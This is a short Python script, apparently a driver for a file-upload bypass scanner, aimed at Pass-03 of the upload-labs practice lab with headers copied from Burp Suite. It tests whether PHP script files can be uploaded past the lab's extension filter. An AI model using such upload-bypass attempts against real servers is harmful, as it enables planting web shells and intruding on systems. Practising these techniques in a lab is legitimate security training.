from checkUploadBypass import FileUploadScanner

burp0_url = "http://upload-labs.com:80/Pass-03/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://upload-labs.com",
                 "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFpMnSvOxunGOEeWL",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                 "Referer": "http://upload-labs.com/Pass-03/index.php", "Accept-Encoding": "gzip, deflate",
                 "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
multipart_fields = {
    "submit": "submit"
}

(FileUploadScanner(flag="../upload/")
 .check_script_extension("php",
                         url=burp0_url,
                         header=burp0_headers,
                         multipart_data=multipart_fields,
                         file_data_key='upload_file'))
